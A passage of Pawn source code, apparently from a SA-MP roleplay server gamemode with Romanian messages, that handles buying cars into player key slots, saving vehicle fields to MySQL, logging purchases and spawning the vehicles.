	   				DespawnCar[playerid][10] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey12] == 0)
				{
					PlayerInfo[playerid][pCarkey12] = idd;
					Update(playerid,pCarkey12x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][11] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey13] == 0)
				{
					PlayerInfo[playerid][pCarkey13] = idd;
					Update(playerid,pCarkey13x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][12] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey14] == 0)
				{
					PlayerInfo[playerid][pCarkey14] = idd;
					Update(playerid,pCarkey14x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][13] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey15] == 0)
				{
					PlayerInfo[playerid][pCarkey15] = idd;
					Update(playerid,pCarkey15x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][14] = 600;
				}
			}
		}
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO cars (`ID`,`Model`) VALUES ('%d','%d')", idd, CarInfo[idd][cModel]);
		mysql_tquery(SQL,var100,"","");
		
		CarInfo[idd][cSell] = 1;
        CarInfo[idd][cID] = idd;
        CarInfo[idd][cModel] = model;

        CarInfo[idd][cColorOne] = 1;
		CarInfo[idd][cColorTwo] = 1;
        strmid(CarInfo[idd][cOwner], PlayerInfo[playerid][pNormalName], 0, 25, 255);
        strmid(CarInfo[idd][cDescription],namecar, 0, strlen(namecar), 255);
        CarInfo[idd][cValue] = value;
        strmid(CarInfo[idd][cLicense], "NewCar", 0, 6, 255);
        CarInfo[idd][cOwned] = 1;
		CarInfo[idd][cLock] = 0;
		CarInfo[idd][cNewEngine] = 0;
		CarInfo[idd][cTimed] = 0;
		CarInfo[idd][cInscarprice] = 100;
		CarInfo[idd][cInsurancecar] = 4;
		CarInfo[idd][cKM] = 0.0;
		CarInfo[idd][cHP] = 1000.0;
		CarInfo[idd][cDamage1] = 0;
		CarInfo[idd][cDamage2] = 0;
		CarInfo[idd][cDamage3] = 0;
		CarInfo[idd][cDamage4] = 0;
		CarInfo[idd][cPaintJ] = 6;
		CarInfo[idd][mod1] = 0;
		CarInfo[idd][mod2] = 0;
		CarInfo[idd][mod3] = 0;
		CarInfo[idd][mod4] = 0;
		CarInfo[idd][mod5] = 0;
		CarInfo[idd][mod6] = 0;
		CarInfo[idd][mod7] = 0;
		CarInfo[idd][mod8] = 0;
		CarInfo[idd][mod9] = 0;
		CarInfo[idd][mod10] = 0;
		CarInfo[idd][mod11] = 0;
		CarInfo[idd][mod12] = 0;
		CarInfo[idd][mod13] = 0;
		CarInfo[idd][mod14] = 0;
		CarInfo[idd][mod15] = 0;
		CarInfo[idd][mod16] = 0;
		CarInfo[idd][mod17] = 0;
		CarInfo[idd][cDays] = 0;
		CarInfo[idd][cGas] = 100;

		vUpdate(idd, cModsx);
		vUpdate(idd, cPaintJx);
		vUpdate(idd, cSellx);
		vUpdate(idd, cLocationxx);
		vUpdate(idd, cLocationyx);
		vUpdate(idd, cLocationzx);
		vUpdate(idd, cAnglex);
		vUpdate(idd, cModelx);
		vUpdate(idd, cColorOnex);
		vUpdate(idd, cColorTwox);
		vUpdate(idd, cOwnerx);
		vUpdate(idd, cValuex);
		vUpdate(idd, cLicensex);
		vUpdate(idd, cDescriptionx);
		vUpdate(idd, cLockx);
		vUpdate(idd, cNewEnginex);
		vUpdate(idd, cTimedx);
		vUpdate(idd, cInscarpricex);
		vUpdate(idd, cInsurancecarx);
		vUpdate(idd, cKMx);
		vUpdate(idd, cOwnedx);
		vUpdate(idd, cDaysx);
		vUpdate(idd, cHPx);
		vUpdate(idd, cDamage1x);
		vUpdate(idd, cDamage2x);
		vUpdate(idd, cDamage3x);
		vUpdate(idd, cDamage4x);
		vUpdate(idd, cGasx);
		
        new car = CreateVehicle(CarInfo[idd][cModel],CarInfo[idd][cLocationx],CarInfo[idd][cLocationy],CarInfo[idd][cLocationz],CarInfo[idd][cAngle],1,1,500000);
        SetVehicleNumberPlate(car,CarInfo[idd][cLicense]);

        new disp[184],nameee[30],stringsss[256];
        format(disp,sizeof(disp),"You bought %s.Please take your car and park it elsewhere.",CarInfo[idd][cDescription]);
		SCM(playerid,COLOR_LIGHTBLUE,disp);
		GetPlayerName(playerid, nameee, sizeof(nameee));
		format(stringsss,sizeof(stringsss),"%s [user:%d] bought a %s [car:%d] for $%s.",nameee,PlayerInfo[playerid][pSQLID],CarInfo[idd][cDescription],CarInfo[idd][cID],FormatNumber(value));
        ABroadCast(COLOR_YELLOW,stringsss,1);
        new y,m,d,h,mi,s,string2[256],string3[256];
		getdate(y,m,d);
		gettime(h,mi,s);
		format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s",d,m,y,h,mi,s,stringsss);
		mysql_real_escape_string(string2, string3);
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','0','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
		mysql_tquery(SQL,var100,"","");

		OwnedVeh(car) = idd;
		if(idd == PlayerInfo[playerid][pPcarkey])
		{
			personalcar[0][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pmotokey])
		{
		    personalcar[1][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pprcarkey])
		{
		    personalcar[2][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pprcarkey2])
		{
		    personalcar[3][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pPPluscarkey])
		{
		    personalcar[4][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pPPluscarkey2])
		{
		    personalcar[5][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey7])
		{
		    personalcar[6][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey8])
		{
		    personalcar[7][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey9])
		{
		    personalcar[8][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey10])
		{
		    personalcar[9][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey11])
		{
		    personalcar[10][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey12])
		{
		    personalcar[11][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey13])
		{
		    personalcar[12][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey14])
		{
		    personalcar[13][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey15])
		{
		    personalcar[14][playerid] = car;
		}
        SwitchKey[playerid] = 1;
    }
    return 1;
}

// type 1 - car | 2 - moto/bike | 3 - heli | 4 - premium cars.
public InsertCar(playerid,type,stockid,giftbox)
{
    new string[128],sendername[25],namecar[100],var100[512];
    masini+=1;
    new idd = masini;
	new model;
	new value;
	model = Stock[stockid][vModel];
	value = Stock[stockid][vPrice];
	if(giftbox == 1)
	{
		value = 0;
	}
	strmid(namecar,Stock[stockid][vName], 0, 100, 255);
    GetPlayerName(playerid,sendername,sizeof(sendername));
    BuyCar[playerid] = -1;
    if(idd != 0)
    {
        if(GetPlayerCash(playerid) < value) return SCM(playerid,COLOR_SERVER,"{FFB870}You do not have enough money.");
        if(type == 1)
        {
			if(PlayerInfo[playerid][pPcarkey] == 0)
			{
				PlayerInfo[playerid][pPcarkey] = idd;
				Update(playerid,pPcarkeyx);
				pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
				CarInfo[idd][cAngle] = 30.000;
				DespawnCar[playerid][0] = 600;
			}
			else
			{
				new masinii = 0;
				if(PlayerInfo[playerid][pPcarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pmotokey] > 0) masinii++;
				if(PlayerInfo[playerid][pprcarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pprcarkey2] > 0) masinii++;
				if(PlayerInfo[playerid][pPPluscarkey] > 0) masinii++;
				if(PlayerInfo[playerid][pPPluscarkey2] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey7] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey8] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey9] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey10] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey11] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey12] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey13] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey14] > 0) masinii++;
				if(PlayerInfo[playerid][pCarkey15] > 0) masinii++;
				if(PlayerInfo[playerid][pVip] < 1 && masinii >= 10) return SCM(playerid, COLOR_ERROR, "Contul tau este unul Standard, nu poti detine mai multe vehicule.");
				if(masinii >= 15) return SCM(playerid, COLOR_ERROR, "Ai ajuns la numarul maxim de vehicule.");
				if(PlayerInfo[playerid][pmotokey] == 0)
				{
					PlayerInfo[playerid][pmotokey] = idd;
					Update(playerid,pmotokeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][1] = 600;
				}
				else if(PlayerInfo[playerid][pprcarkey] == 0)
				{
					PlayerInfo[playerid][pprcarkey] = idd;
					Update(playerid,pprcarkeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][2] = 600;
				}
				else if(PlayerInfo[playerid][pprcarkey2] == 0)
				{
					PlayerInfo[playerid][pprcarkey2] = idd;
					Update(playerid,pprcarkey2x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
					CarInfo[idd][cAngle] = 30.000;
					DespawnCar[playerid][3] = 600;
				}
				else if(PlayerInfo[playerid][pPPluscarkey] == 0)
				{
					PlayerInfo[playerid][pPPluscarkey] = idd;
					Update(playerid,pPPluscarkeyx);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][4] = 600;
				}
				else if(PlayerInfo[playerid][pPPluscarkey2] == 0)
				{
					PlayerInfo[playerid][pPPluscarkey2] = idd;
					Update(playerid,pPPluscarkey2x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][5] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey7] == 0)
				{
					PlayerInfo[playerid][pCarkey7] = idd;
					Update(playerid,pCarkey7x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][6] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey8] == 0)
				{
					PlayerInfo[playerid][pCarkey8] = idd;
					Update(playerid,pCarkey8x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][7] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey9] == 0)
				{
					PlayerInfo[playerid][pCarkey9] = idd;
					Update(playerid,pCarkey9x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][8] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey10] == 0)
				{
					PlayerInfo[playerid][pCarkey10] = idd;
					Update(playerid,pCarkey10x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][9] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey11] == 0)
				{
					PlayerInfo[playerid][pCarkey11] = idd;
					Update(playerid,pCarkey11x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][10] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey12] == 0)
				{
					PlayerInfo[playerid][pCarkey12] = idd;
					Update(playerid,pCarkey12x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][11] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey13] == 0)
				{
					PlayerInfo[playerid][pCarkey13] = idd;
					Update(playerid,pCarkey13x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][12] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey14] == 0)
				{
					PlayerInfo[playerid][pCarkey14] = idd;
					Update(playerid,pCarkey14x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][13] = 600;
				}
				else if(PlayerInfo[playerid][pCarkey15] == 0)
				{
					PlayerInfo[playerid][pCarkey15] = idd;
					Update(playerid,pCarkey15x);
					pozitienoua++,CarInfo[idd][cLocationx] = dspozitii[pozitienoua][0],CarInfo[idd][cLocationy] = dspozitii[pozitienoua][1],CarInfo[idd][cLocationz] = dspozitii[pozitienoua][2];
	   				CarInfo[idd][cAngle] = 30.000;
	   				DespawnCar[playerid][14] = 600;
				}
			}
		}

    	Stock[stockid][vStock]--;
        mysql_format(SQL, string, sizeof(string), "UPDATE stock SET Stock='%d' WHERE ID='%d'", Stock[stockid][vStock],stockid);
		mysql_tquery(SQL,string,"","");
		
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO cars (`ID`,`Model`) VALUES ('%d','%d')", idd, CarInfo[idd][cModel]);
		mysql_tquery(SQL,var100,"","");

		GivePlayerCash(playerid,-value);
		Update(playerid,pCashx);
		
		new sqlupdate[1000];
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET BaniReff=BaniReff+%d WHERE `id`='%d'",value/10,PlayerInfo[playerid][pReferral]);
		mysql_tquery(SQL, sqlupdate, "", "");

		CarInfo[idd][cSell] = 1;
        CarInfo[idd][cID] = idd;
        CarInfo[idd][cModel] = model;

        CarInfo[idd][cColorOne] = vcol1[playerid];
		CarInfo[idd][cColorTwo] = vcol2[playerid];
        strmid(CarInfo[idd][cOwner], PlayerInfo[playerid][pNormalName], 0, 25, 255);
        strmid(CarInfo[idd][cDescription],namecar, 0, strlen(namecar), 255);
        CarInfo[idd][cValue] = value;
        strmid(CarInfo[idd][cLicense], "NewCar", 0, 6, 255);
        CarInfo[idd][cOwned] = 1;
		CarInfo[idd][cLock] = 0;
		CarInfo[idd][cNewEngine] = 0;
		CarInfo[idd][cTimed] = 0;
		CarInfo[idd][cInscarprice] = 100;
		CarInfo[idd][cInsurancecar] = 4;
		CarInfo[idd][cKM] = 0.0;
		CarInfo[idd][cHP] = 1000.0;
		CarInfo[idd][cDamage1] = 0;
		CarInfo[idd][cDamage2] = 0;
		CarInfo[idd][cDamage3] = 0;
		CarInfo[idd][cDamage4] = 0;
		CarInfo[idd][cGas] = 100;
		CarInfo[idd][cPaintJ] = 6;
		CarInfo[idd][mod1] = 0;
		CarInfo[idd][mod2] = 0;
		CarInfo[idd][mod3] = 0;
		CarInfo[idd][mod4] = 0;
		CarInfo[idd][mod5] = 0;
		CarInfo[idd][mod6] = 0;
		CarInfo[idd][mod7] = 0;
		CarInfo[idd][mod8] = 0;
		CarInfo[idd][mod9] = 0;
		CarInfo[idd][mod10] = 0;
		CarInfo[idd][mod11] = 0;
		CarInfo[idd][mod12] = 0;
		CarInfo[idd][mod13] = 0;
		CarInfo[idd][mod14] = 0;
		CarInfo[idd][mod15] = 0;
		CarInfo[idd][mod16] = 0;
		CarInfo[idd][mod17] = 0;
		CarInfo[idd][cDays] = 0;

		vUpdate(idd, cModsx);
		vUpdate(idd, cPaintJx);
		vUpdate(idd, cSellx);
		vUpdate(idd, cLocationxx);
		vUpdate(idd, cLocationyx);
		vUpdate(idd, cLocationzx);
		vUpdate(idd, cAnglex);
		vUpdate(idd, cModelx);
		vUpdate(idd, cColorOnex);
		vUpdate(idd, cColorTwox);
		vUpdate(idd, cOwnerx);
		vUpdate(idd, cValuex);
		vUpdate(idd, cLicensex);
		vUpdate(idd, cDescriptionx);
		vUpdate(idd, cLockx);
		vUpdate(idd, cNewEnginex);
		vUpdate(idd, cTimedx);
		vUpdate(idd, cInscarpricex);
		vUpdate(idd, cInsurancecarx);
		vUpdate(idd, cKMx);
		vUpdate(idd, cOwnedx);
		vUpdate(idd, cDaysx);
		vUpdate(idd, cHPx);
		vUpdate(idd, cDamage1x);
		vUpdate(idd, cDamage2x);
		vUpdate(idd, cDamage3x);
		vUpdate(idd, cDamage4x);
		vUpdate(idd, cGasx);

        new car = CreateVehicle(CarInfo[idd][cModel],CarInfo[idd][cLocationx],CarInfo[idd][cLocationy],CarInfo[idd][cLocationz],CarInfo[idd][cAngle],CarInfo[idd][cColorOne],CarInfo[idd][cColorTwo],500000);
        SetVehicleNumberPlate(car,CarInfo[idd][cLicense]);

        new disp[184],stringsss[256],numele[30];
		if(giftbox == 0)
		{
			format(disp,sizeof(disp),"You bought %s.Please take your car and park it elsewhere.",CarInfo[idd][cDescription]);
			SCM(playerid,COLOR_LIGHTBLUE,disp);
			GetPlayerName(playerid, numele, sizeof(numele));
			format(stringsss,sizeof(stringsss),"%s [user:%d] bought a %s [car:%d] for $%s.",numele,PlayerInfo[playerid][pSQLID],CarInfo[idd][cDescription],CarInfo[idd][cID],FormatNumber(value));
			ABroadCast(COLOR_YELLOW,stringsss,1);
		}	
        new y,m,d,h,mi,s,string2[256],string3[256];
		getdate(y,m,d);
		gettime(h,mi,s);
		format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s",d,m,y,h,mi,s,stringsss);
		mysql_real_escape_string(string2, string3);
		mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','0','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
		mysql_tquery(SQL,var100,"","");

		OwnedVeh(car) = idd;
		if(idd == PlayerInfo[playerid][pPcarkey])
		{
			personalcar[0][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pmotokey])
		{
		    personalcar[1][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pprcarkey])
		{
		    personalcar[2][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pprcarkey2])
		{
		    personalcar[3][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pPPluscarkey])
		{
		    personalcar[4][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pPPluscarkey2])
		{
		    personalcar[5][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey7])
		{
		    personalcar[6][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey8])
		{
		    personalcar[7][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey9])
		{
		    personalcar[8][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey10])
		{
		    personalcar[9][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey11])
		{
		    personalcar[10][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey12])
		{
		    personalcar[11][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey13])
		{
		    personalcar[12][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey14])
		{
		    personalcar[13][playerid] = car;
		}
		if(idd == PlayerInfo[playerid][pCarkey15])
		{
		    personalcar[14][playerid] = car;
		}
        SwitchKey[playerid] = 1;
    }
    return 1;
}

public vUpdate(vehicleid, type)
{
	new gQuery[1024];
	switch(type)
	{
	    case cLocationxx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Locationx`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cLocationx],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cLocationyx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Locationy`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cLocationy],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cLocationzx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Locationz`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cLocationz],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cAnglex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Angle`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cAngle],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cModelx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Model`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cModel],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cColorOnex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `ColorOne`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cColorOne],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cColorTwox:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `ColorTwo`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cColorTwo],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cOwnerx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Owner`='%s' WHERE `ID`='%d'",CarInfo[vehicleid][cOwner],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cValuex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Value`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cValue],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cLicensex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `License`='%s' WHERE `ID`='%d'",CarInfo[vehicleid][cLicense],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cDescriptionx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Description`='%s' WHERE `ID`='%d'",CarInfo[vehicleid][cDescription],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cLockx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Lockk`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cLock],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cNewEnginex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `NewEngine`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cNewEngine],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cTimedx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Timed`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cTimed],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cInscarpricex:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Inscarprice`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cInscarprice],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cInsurancecarx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Insurancecar`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cInsurancecar],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cKMx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `KM`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cKM],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cHPx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `HP`='%f' WHERE `ID`='%d'",CarInfo[vehicleid][cHP],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cGasx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Gas`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cGas],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cDamage1x:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Damage1`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cDamage1],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cDamage2x:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Damage2`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cDamage2],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cDamage3x:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Damage3`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cDamage3],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
		case cDamage4x:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Damage4`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cDamage4],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cOwnedx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Owned`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cOwned],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cSellx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `Sell`='%d' WHERE `ID`='%d'",CarInfo[vehicleid][cSell],vehicleid);
			mysql_tquery(SQL,gQuery,"","");
	    }
	    case cModsx:
	    {
	        mysql_format(SQL,gQuery,sizeof(gQuery),"UPDATE `cars` SET `mod1`='%d',`mod2`='%d',`mod3`='%d',`mod4`='%d',`mod5`='%d',`mod6`='%d',`mod7`='%d',`mod8`='%d',`mod9`='%d',`mod10`='%d',`mod11`='%d',`mod12`='%d',`mod13`='%d',`mod14`='%d',`mod15`='%d',`mod16`='%d',`mod17`='%d' WHERE `ID`='%d'",
			CarInfo[vehicleid][mod1],
			CarInfo[vehicleid][mod2],
			CarInfo[vehicleid][mod3],
			CarInfo[vehicleid][mod4],
			CarInfo[vehicleid][mod5],
			CarInfo[vehicleid][mod6],
			CarInfo[vehicleid][mod7],
			CarInfo[vehicleid][mod8],
			CarInfo[vehicleid][mod9],
			CarInfo[vehicleid][mod10],
			CarInfo[vehicleid][mod11],
			CarInfo[vehicleid][mod12],
